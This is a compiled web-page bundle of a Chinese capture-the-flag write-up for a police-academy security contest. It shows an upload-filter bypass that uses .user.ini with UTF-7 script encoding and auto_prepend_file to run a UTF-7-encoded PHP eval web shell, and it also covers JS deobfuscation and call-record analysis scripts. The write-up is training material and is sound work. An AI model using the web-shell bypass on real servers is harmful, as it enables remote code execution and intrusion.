"use strict";(self.webpackChunkremote_website=self.webpackChunkremote_website||[]).push([[2963],{568:(n,e,r)=>{r.d(e,{A:()=>i});const i=r.p+"assets/images/image-20250524223205232-5d9a07b563268071f3c32f7fbf1087a1.png"},16896:(n,e,r)=>{r.r(e),r.d(e,{assets:()=>p,contentTitle:()=>c,default:()=>d,frontMatter:()=>o,metadata:()=>i,toc:()=>a});const i=JSON.parse('{"id":"CTF/Misc/\u7b2c\u4e09\u5c4a\u9ec4\u6cb3\u6d41\u57df\u516c\u5b89\u9662\u6821\u7f51\u7edc\u5b89\u5168\u6280\u80fd\u6311\u6218\u8d5b","title":"\u7b2c\u4e09\u5c4a\u9ec4\u6cb3\u6d41\u57df\u516c\u5b89\u9662\u6821\u7f51\u7edc\u5b89\u5168\u6280\u80fd\u6311\u6218\u8d5b","description":"web","source":"@site/docs/CTF/Misc/\u7b2c\u4e09\u5c4a\u9ec4\u6cb3\u6d41\u57df\u516c\u5b89\u9662\u6821\u7f51\u7edc\u5b89\u5168\u6280\u80fd\u6311\u6218\u8d5b.md","sourceDirName":"CTF/Misc","slug":"/CTF/Misc/\u7b2c\u4e09\u5c4a\u9ec4\u6cb3\u6d41\u57df\u516c\u5b89\u9662\u6821\u7f51\u7edc\u5b89\u5168\u6280\u80fd\u6311\u6218\u8d5b","permalink":"/docs/CTF/Misc/\u7b2c\u4e09\u5c4a\u9ec4\u6cb3\u6d41\u57df\u516c\u5b89\u9662\u6821\u7f51\u7edc\u5b89\u5168\u6280\u80fd\u6311\u6218\u8d5b","draft":false,"unlisted":false,"editUrl":"https://github.com/C0rr3c7/C0rr3c7.github.io/tree/master/docs/CTF/Misc/\u7b2c\u4e09\u5c4a\u9ec4\u6cb3\u6d41\u57df\u516c\u5b89\u9662\u6821\u7f51\u7edc\u5b89\u5168\u6280\u80fd\u6311\u6218\u8d5b.md","tags":[],"version":"current","frontMatter":{},"sidebar":"CTFSidebar","previous":{"title":"\u5b89\u6d35\u676f2019-easy_serialize_php","permalink":"/docs/CTF/Misc/\u5b89\u6d35\u676f2019-easy_serialize_php"},"next":{"title":"\u7f51\u9f0e\u676f2018-Fakebook","permalink":"/docs/CTF/Misc/\u7f51\u9f0e\u676f2018-Fakebook"}}');var t=r(74848),s=r(28453);const o={},c=void 0,p={},a=[{value:"web",id:"web",level:2},{value:"\u5976\u9f99\u724c\u56fe\u7247\u5904\u7406\u56682.0",id:"\u5976\u9f99\u724c\u56fe\u7247\u5904\u7406\u566820",level:3},{value:"\u5916\u56fd\u5c71\u6d77\u7ecf",id:"\u5916\u56fd\u5c71\u6d77\u7ecf",level:3},{value:"\u5927\u6570\u636e",id:"\u5927\u6570\u636e",level:2},{value:"001",id:"001",level:3},{value:"002",id:"002",level:3}];function h(n){const e={a:"a",blockquote:"blockquote",code:"code",h2:"h2",h3:"h3",img:"img",p:"p",pre:"pre",...(0,s.R)(),...n.components};return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)(e.h2,{id:"web",children:"web"}),"\n",(0,t.jsx)(e.h3,{id:"\u5976\u9f99\u724c\u56fe\u7247\u5904\u7406\u566820",children:"\u5976\u9f99\u724c\u56fe\u7247\u5904\u7406\u56682.0"}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{alt:"image-20250524220650083",src:r(38967).A+"",width:"774",height:"334"})}),"\n",(0,t.jsxs)(e.p,{children:["\u4e0a\u4f20\u6587\u4ef6\u76ee\u5f55\u5b58\u5728php\u6587\u4ef6\uff0c\u4e0a\u4f20",(0,t.jsx)(e.code,{children:".user.ini"}),"\u7ed5\u8fc7"]}),"\n",(0,t.jsxs)(e.blockquote,{children:["\n",(0,t.jsxs)(e.p,{children:[(0,t.jsx)(e.code,{children:" .user.ini"}),"\u5b83\u6bd4",(0,t.jsx)(e.code,{children:".htaccess"}),"\u7528\u7684\u66f4\u5e7f\uff0c\u4e0d\u7ba1\u662f",(0,t.jsx)(e.code,{children:"nginx/apache/IIS"}),"\uff0c\u53ea\u8981\u662f\u4ee5",(0,t.jsx)(e.code,{children:"fastcgi"}),"\u8fd0\u884c\u7684php\u90fd\u53ef\u4ee5\u7528\u8fd9\u4e2a\u65b9\u6cd5\uff0c",(0,t.jsx)(e.code,{children:"php>=5.3.0"})]}),"\n"]}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{children:"auto_append_file   ; \u6307\u5b9a\u4e00\u4e2a\u6587\u4ef6\uff0c\u81ea\u52a8\u5305\u542b\u5728\u8981\u6267\u884c\u7684\u6587\u4ef6\u524d\u3002\r\nauto_prepend_file  ; \u6307\u5b9a\u4e00\u4e2a\u6587\u4ef6\uff0c\u81ea\u52a8\u5305\u542b\u5728\u8981\u6267\u884c\u7684\u6587\u4ef6\u540e\u3002\n"})}),"\n",(0,t.jsxs)(e.p,{children:["\u4f46\u662f\u6709\u6587\u4ef6\u5185\u5bb9\u68c0\u6d4b\uff0c\u9700\u8981\u7528",(0,t.jsx)(e.code,{children:"UTF-7"}),"\u7f16\u7801\u7ed5\u8fc7\uff08\u8fc7\u6ee4\u4e86",(0,t.jsx)(e.code,{children:"<?"}),",",(0,t.jsx)(e.code,{children:"php"}),"\uff09"]}),"\n",(0,t.jsxs)(e.p,{children:["\u9996\u5148\u4e0a\u4f20",(0,t.jsx)(e.code,{children:".user.ini"})]}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{children:"zend.multibyte=1\r\nzend.script_encoding=utf-7\r\nauto_prepend_file=1.png\n"})}),"\n",(0,t.jsxs)(e.p,{children:["\u5c06\u4e00\u53e5\u8bdd\u6728\u9a6c\u8f6c\u6210",(0,t.jsx)(e.code,{children:"UTF-7"}),"\u7f16\u7801"]}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-php",children:'<?php\r\necho iconv("UTF-8","UTF-7",\'<?= eval($_POST[1]);\');\n'})}),"\n",(0,t.jsxs)(e.p,{children:["\u4e0a\u4f20",(0,t.jsx)(e.code,{children:"1.png"}),"\uff0c\u5185\u5bb9\u5982\u4e0b\uff1a"]}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-php",children:"+ADw?+AD0 eval(+ACQAXw-POST+AFs-1+AF0)+ADs-\n"})}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{alt:"image-20250524221517912",src:r(76953).A+"",width:"980",height:"624"})}),"\n",(0,t.jsx)(e.h3,{id:"\u5916\u56fd\u5c71\u6d77\u7ecf",children:"\u5916\u56fd\u5c71\u6d77\u7ecf"}),"\n",(0,t.jsxs)(e.p,{children:["\u6709\u4e2a",(0,t.jsx)(e.code,{children:"flag.php"})]}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{alt:"image-20250524221632634",src:r(36442).A+"",width:"1800",height:"894"})}),"\n",(0,t.jsxs)(e.p,{children:["\u67e5\u770b\u6e90\u4ee3\u7801\uff0c\u53d1\u73b0\u5b58\u5728",(0,t.jsx)(e.code,{children:"JS"}),"\u4ee3\u7801\uff0c\u4f46\u662f\u8fdb\u884c\u4e86\u6df7\u6dc6\uff0c\u627e\u4e2a\u5728\u7ebf\u7f51\u7ad9\u5c31\u884c"]}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-php",children:"(function(_0x5bfa63,_0x281ba4){var _0x628a90={.......}\n"})}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.a,{href:"http://www.esjson.com/jsGarbleEncrypt.html",children:"http://www.esjson.com/jsGarbleEncrypt.html"})}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-php",children:"There is more to come\r\nrqxvweqty\uff0cJust part of it\r\nfshbs.php\uff0cStitch it together\n"})}),"\n",(0,t.jsxs)(e.p,{children:["\u62fc\u63a5\u8d77\u6765\u5c31\u662f",(0,t.jsx)(e.code,{children:"rqxvweqtyfshbs.php"})]}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{alt:"image-20250524222112936",src:r(64051).A+"",width:"911",height:"303"})}),"\n",(0,t.jsx)(e.h2,{id:"\u5927\u6570\u636e",children:"\u5927\u6570\u636e"}),"\n",(0,t.jsx)(e.h3,{id:"001",children:"001"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-php",children:"\u548c\u5acc\u7591\u4eba170****5678 \u901a\u8bdd\u6b21\u6570\u6700\u591a\u7684\u5bf9\u65b9\u53f7\u7801\u662f\u54ea\u4e00\u4e2a\uff1f\u3010\u4f8b\uff1aflag{170****5678}\u3011\n"})}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{alt:"image-20250524222328856",src:r(76155).A+"",width:"1389",height:"611"})}),"\n",(0,t.jsxs)(e.p,{children:["\u9644\u4ef6\u4e2d\u5168\u90e8\u662f\u56fe\u7247\uff0c\u9700\u8981\u4f7f\u7528",(0,t.jsx)(e.code,{children:"OCR"}),"\u8fdb\u884c\u8bc6\u522b"]}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-python",children:"import os\r\nfrom PIL import Image\r\nimport pytesseract\r\n\r\n# \u6307\u5b9aTesseract\u7684\u5b89\u88c5\u8def\u5f84\uff08\u6839\u636e\u60a8\u7684\u5b89\u88c5\u8def\u5f84\u8c03\u6574\uff09\r\npytesseract.pytesseract.tesseract_cmd = r'D:\\Tesseract-OCR\\tesseract.exe'\r\n\r\n# \u8bbe\u7f6e\u56fe\u50cf\u76ee\u5f55\r\nimage_directory = './'  # \u66ff\u6362\u4e3a\u60a8\u7684\u56fe\u7247\u76ee\u5f55\u8def\u5f84\r\noutput_file = 'extracted_data.txt'  # \u8f93\u51fa\u6587\u672c\u6587\u4ef6\r\n\r\n# \u521b\u5efa\u6216\u6e05\u7a7a\u8f93\u51fa\u6587\u4ef6\r\nwith open(output_file, 'w', encoding='utf-8') as f:\r\n    pass\r\n\r\n# \u904d\u5386\u76ee\u5f55\u4e2d\u7684\u6240\u6709\u56fe\u50cf\u6587\u4ef6\r\nfor filename in os.listdir(image_directory):\r\n    if filename.endswith('.jpg') or filename.endswith('.png') or filename.endswith('.jpeg'):  # \u6839\u636e\u9700\u8981\u6dfb\u52a0\u66f4\u591a\u683c\u5f0f\r\n        image_path = os.path.join(image_directory, filename)\r\n        \r\n        # \u8bfb\u53d6\u56fe\u50cf\r\n        image = Image.open(image_path)\r\n        \r\n        # \u4f7f\u7528OCR\u63d0\u53d6\u6587\u672c\r\n        extracted_text = pytesseract.image_to_string(image, lang='chi_sim')  # \u5982\u679c\u63d0\u53d6\u4e2d\u6587\u53ef\u4ee5\u6307\u5b9a\u8bed\u8a00\r\n        \r\n        # \u5c06\u63d0\u53d6\u7684\u6587\u672c\u5199\u5165\u6587\u4ef6\r\n        with open(output_file, 'a', encoding='utf-8') as f:\r\n            f.write(f\"--- {filename} ---\\n\")\r\n            f.write(extracted_text)\r\n            f.write(\"\\n\\n\")\r\n\r\nprint(f\"\u6570\u636e\u5df2\u63d0\u53d6\u5230 {output_file} \u4e2d\u3002\")\n"})}),"\n",(0,t.jsx)(e.p,{children:"\u63d0\u53d6\u51fa\u6765\u7684\u683c\u5f0f\u4e0d\u592a\u5bf9\uff0c\u53ea\u9700\u8981\u672c\u673a\uff0c\u5bf9\u65b9\u53f7\u7801\uff0c\u9700\u8981\u5c06\u5176\u4ed6\u5b57\u7b26\u53bb\u9664"}),"\n",(0,t.jsx)(e.p,{children:"\u7136\u540e\u5bf9\u5e94\u4e00\u4e0b\u53f7\u7801"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-python",children:"# \u8bfb\u53d6\u63d0\u53d6\u7684\u6570\u636e\r\ndata_file = 'extracted_data.txt'  # \u66ff\u6362\u4e3a\u60a8\u7684\u63d0\u53d6\u6587\u672c\u6587\u4ef6\u8def\u5f84\r\n\r\n# \u521d\u59cb\u5316\u53d8\u91cf\r\nphone_pairs = []\r\ncurrent_image = \"\"\r\ncurrent_phones = []\r\ntarget_phone = \"170****5678\"  # \u8bbe\u5b9a\u76ee\u6807\u7535\u8bdd\u53f7\u7801\r\ntarget_phone_counts = {}\r\n\r\n# \u8bfb\u53d6\u6570\u636e\u5e76\u53bb\u6389\u7a7a\u884c\r\nwith open(data_file, 'r', encoding='utf-8') as f:\r\n    lines = f.readlines()\r\n\r\n# \u904d\u5386\u6bcf\u4e00\u884c\r\nfor line in lines:\r\n    line = line.strip()\r\n    if line.startswith('---') and line.endswith('---'):  # \u5224\u65ad\u662f\u5426\u662f\u5206\u5272\u6807\u5fd7\r\n        if current_phones:  # \u5982\u679c\u5f53\u524d\u53f7\u7801\u5217\u8868\u4e0d\u4e3a\u7a7a\uff0c\u5219\u5904\u7406\u914d\u5bf9\r\n            # \u8fdb\u884c\u914d\u5bf9\r\n            for i in range(min(len(current_phones) // 2, 100)):  # \u53ea\u53d6\u524d100\u5bf9\r\n                main_phone = current_phones[i]\r\n                corresponding_phone = current_phones[i + 100] if i + 100 < len(current_phones) else None\r\n                if corresponding_phone:\r\n                    phone_pairs.append(f\"{main_phone} \u5bf9\u5e94 {corresponding_phone}\")\r\n                    # \u7edf\u8ba1\u76ee\u6807\u7535\u8bdd\u53f7\u7801\u5bf9\u5e94\u7684\u53f7\u7801\r\n                    if main_phone == target_phone:\r\n                        if corresponding_phone in target_phone_counts:\r\n                            target_phone_counts[corresponding_phone] += 1\r\n                        else:\r\n                            target_phone_counts[corresponding_phone] = 1\r\n\r\n        current_image = line  # \u66f4\u65b0\u5f53\u524d\u56fe\u7247\u6807\u5fd7\r\n        current_phones = []  # \u6e05\u7a7a\u5f53\u524d\u53f7\u7801\u5217\u8868\r\n        continue\r\n    \r\n    if line:  # \u5982\u679c\u4e0d\u662f\u7a7a\u884c\r\n        current_phones.append(line)  # \u6dfb\u52a0\u7535\u8bdd\u53f7\u7801\u5230\u5217\u8868\u4e2d\r\n\r\n# \u5904\u7406\u6700\u540e\u4e00\u7ec4\u53f7\u7801\uff08\u5982\u679c\u6709\u7684\u8bdd\uff09\r\nif current_phones:\r\n    for i in range(min(len(current_phones) // 2, 100)):\r\n        main_phone = current_phones[i]\r\n        corresponding_phone = current_phones[i + 100] if i + 100 < len(current_phones) else None\r\n        if corresponding_phone:\r\n            phone_pairs.append(f\"{main_phone} \u5bf9\u5e94 {corresponding_phone}\")\r\n            # \u7edf\u8ba1\u76ee\u6807\u7535\u8bdd\u53f7\u7801\u5bf9\u5e94\u7684\u53f7\u7801\r\n            if main_phone == target_phone:\r\n                if corresponding_phone in target_phone_counts:\r\n                    target_phone_counts[corresponding_phone] += 1\r\n                else:\r\n                    target_phone_counts[corresponding_phone] = 1\r\n\r\n# \u8f93\u51fa\u914d\u5bf9\u7ed3\u679c\u5230\u6587\u4ef6\r\noutput_file = 'phone_pairs.txt'  # \u8f93\u51fa\u6587\u4ef6\u540d\uff0c\u53ef\u4ee5\u6839\u636e\u9700\u8981\u4fee\u6539\r\nwith open(output_file, 'w', encoding='utf-8') as f:\r\n    for pair in phone_pairs:\r\n        f.write(pair + '\\n')\r\n\r\n# \u8f93\u51fa\u76ee\u6807\u7535\u8bdd\u53f7\u7801\u5bf9\u5e94\u7684\u53f7\u7801\u53ca\u5176\u51fa\u73b0\u6b21\u6570\r\ncount_output_file = 'target_phone_counts.txt'  # \u7edf\u8ba1\u7ed3\u679c\u8f93\u51fa\u6587\u4ef6\u540d\r\nwith open(count_output_file, 'w', encoding='utf-8') as f:\r\n    f.write(f\"\u4e0e {target_phone} \u5bf9\u5e94\u7684\u53f7\u7801\u53ca\u5176\u51fa\u73b0\u6b21\u6570:\\n\")\r\n    for phone, count in target_phone_counts.items():\r\n        f.write(f\"{phone}: {count} \u6b21\\n\")\r\n\r\nprint(f\"\u7535\u8bdd\u53f7\u7801\u914d\u5bf9\u7ed3\u679c\u5df2\u4fdd\u5b58\u5230 {output_file} \u4e2d\u3002\")\r\nprint(f\"\u4e0e {target_phone} \u5bf9\u5e94\u7684\u53f7\u7801\u53ca\u5176\u51fa\u73b0\u6b21\u6570\u5df2\u4fdd\u5b58\u5230 {count_output_file} \u4e2d\u3002\")\n"})}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{alt:"image-20250524222938213",src:r(44847).A+"",width:"640",height:"480"})}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{children:"133****0181: 405 \u6b21\n"})}),"\n",(0,t.jsx)(e.h3,{id:"002",children:"002"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{children:'\u8bf7\u95ee\u548c\u5df2\u77e5\u7684 6 \u4f4d\u5acc\u7591\u4eba\u90fd\u6709\u8fc7\u901a\u8bdd\u5173\u7cfb\u7684\u5bf9\u65b9\u53f7\u7801\u6709\u54ea\u4e9b\uff1f\u3010\u82e5\u6709\u591a\u4e2a\u53f7\u7801\uff0c\u624b\u673a\u53f7\u7801\u4e4b\u95f4\u7528"-"\u8fde\u63a5\uff0c\u5e76\u5c06\u53f7\u7801\u7531\u5c0f\u81f3\u5927\u5217\u51fa\uff0c\u4f8b\uff1aflag{1705678-1705678-170****5678...}\u3011\n'})}),"\n",(0,t.jsx)(e.p,{children:"\u7edf\u8ba1\u6bcf\u4e2a\u5acc\u7591\u4eba\u7684\u7535\u8bdd\u53f7\u7801\u7684\u5bf9\u5e94\u7684\u53f7\u7801\uff0c\u751f\u6210\u51e0\u4e2a\u6587\u4ef6"}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{alt:"image-20250524223205232",src:r(568).A+"",width:"803",height:"223"})}),"\n",(0,t.jsx)(e.p,{children:"\u5185\u5bb9\uff1a"}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{alt:"image-20250524223420740",src:r(88541).A+"",width:"687",height:"403"})}),"\n",(0,t.jsx)(e.p,{children:"\u5199\u4e2a\u811a\u672c\uff0c\u5c06\u4e0e 6 \u4f4d\u5acc\u7591\u4eba\u90fd\u6709\u8fc7\u901a\u8bdd\u5173\u7cfb\u7684\u5bf9\u65b9\u53f7\u7801\u63d0\u53d6\u51fa\u6765"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-python",children:"import os\r\nimport re\r\n\r\n# \u6587\u4ef6\u5217\u8868\uff0c\u66ff\u6362\u4e3a\u60a8\u76846\u4e2a\u6587\u4ef6\u7684\u8def\u5f84\r\nfile_list = [\r\n    '1352345.txt',  # \u66ff\u6362\u4e3a\u60a8\u7684\u6587\u4ef6\u540d\r\n    '1387383.txt',\r\n    '1539888.txt',\r\n    '1557991.txt',\r\n    '1570947.txt',\r\n    '1705678.txt'\r\n]\r\n\r\n# \u521d\u59cb\u5316\u4e00\u4e2a\u5217\u8868\u7528\u4e8e\u5b58\u50a8\u6bcf\u4e2a\u6587\u4ef6\u4e2d\u7684\u7535\u8bdd\u53f7\u7801\u96c6\u5408\r\nphone_sets = []\r\n\r\n# \u6b63\u5219\u8868\u8fbe\u5f0f\uff0c\u7528\u4e8e\u5339\u914d\u7535\u8bdd\u53f7\u7801\r\nphone_pattern = re.compile(r'(\\d{3}\\*\\*\\*\\*\\d{4})')\r\n\r\n# \u8bfb\u53d6\u6bcf\u4e2a\u6587\u4ef6\u5e76\u63d0\u53d6\u7535\u8bdd\u53f7\u7801\r\nfor file_name in file_list:\r\n    if os.path.exists(file_name):\r\n        with open(file_name, 'r', encoding='utf-8') as f:\r\n            phones = set()  # \u4f7f\u7528\u96c6\u5408\u53bb\u91cd\r\n            for line in f:\r\n                match = phone_pattern.findall(line)  # \u67e5\u627e\u5339\u914d\u7684\u7535\u8bdd\u53f7\u7801\r\n                if match:\r\n                    phones.update(match)  # \u5c06\u627e\u5230\u7684\u53f7\u7801\u6dfb\u52a0\u5230\u96c6\u5408\u4e2d\r\n            phone_sets.append(phones)\r\n    else:\r\n        print(f\"\u6587\u4ef6 {file_name} \u4e0d\u5b58\u5728\u3002\")\r\n\r\n# \u627e\u51fa\u6240\u6709\u6587\u4ef6\u4e2d\u90fd\u5b58\u5728\u7684\u7535\u8bdd\u53f7\u7801\r\nif phone_sets:\r\n    common_phones = set.intersection(*phone_sets)\r\n\r\n    # \u8f93\u51fa\u7ed3\u679c\u5230\u6587\u4ef6\r\n    output_file = 'common_phones.txt'  # \u8f93\u51fa\u6587\u4ef6\u540d\r\n    with open(output_file, 'w', encoding='utf-8') as f:\r\n        if common_phones:\r\n            for phone in common_phones:\r\n                f.write(phone + '\\n')\r\n            print(f\"\u5728\u6240\u6709\u6587\u4ef6\u4e2d\u90fd\u5b58\u5728\u7684\u7535\u8bdd\u53f7\u7801\u5df2\u4fdd\u5b58\u5230 {output_file} \u4e2d\u3002\")\r\n        else:\r\n            print(\"\u6ca1\u6709\u5728\u6240\u6709\u6587\u4ef6\u4e2d\u90fd\u5b58\u5728\u7684\u7535\u8bdd\u53f7\u7801\u3002\")\r\nelse:\r\n    print(\"\u6ca1\u6709\u6709\u6548\u7684\u6587\u4ef6\u8fdb\u884c\u5904\u7406\u3002\")\n"})}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{alt:"image-20250524223703915",src:r(40687).A+"",width:"776",height:"150"})}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{children:"158****6074\n"})})]})}function d(n={}){const{wrapper:e}={...(0,s.R)(),...n.components};return e?(0,t.jsx)(e,{...n,children:(0,t.jsx)(h,{...n})}):h(n)}},28453:(n,e,r)=>{r.d(e,{R:()=>o,x:()=>c});var i=r(96540);const t={},s=i.createContext(t);function o(n){const e=i.useContext(s);return i.useMemo((function(){return"function"==typeof n?n(e):{...e,...n}}),[e,n])}function c(n){let e;return e=n.disableParentContext?"function"==typeof n.components?n.components(t):n.components||t:o(n.components),i.createElement(s.Provider,{value:e},n.children)}},36442:(n,e,r)=>{r.d(e,{A:()=>i});const i=r.p+"assets/images/image-20250524221632634-0995b4d870293b5f7bcdb99343357cea.png"},38967:(n,e,r)=>{r.d(e,{A:()=>i});const i=r.p+"assets/images/image-20250524220650083-cced50e237903021077d0adcb2d3012c.png"},40687:(n,e,r)=>{r.d(e,{A:()=>i});const i=r.p+"assets/images/image-20250524223703915-a79a4f5cd26458789f8b3535b08ab75d.png"},44847:(n,e,r)=>{r.d(e,{A:()=>i});const i=r.p+"assets/images/image-20250524222938213-d9184bacdf023d4d4e20895edf974162.png"},64051:(n,e,r)=>{r.d(e,{A:()=>i});const i=r.p+"assets/images/image-20250524222112936-b05eb8260c44d82fbc3eb18759a2bca1.png"},76155:(n,e,r)=>{r.d(e,{A:()=>i});const i=r.p+"assets/images/image-20250524222328856-17121a167011f24d843b388fc7d35b39.png"},76953:(n,e,r)=>{r.d(e,{A:()=>i});const i=r.p+"assets/images/image-20250524221517912-59932b8f476c2144b2417a5c121e30a9.png"},88541:(n,e,r)=>{r.d(e,{A:()=>i});const i=r.p+"assets/images/image-20250524223420740-1789c06b92452cd3eef8f9ebfff6fdf7.png"}}]);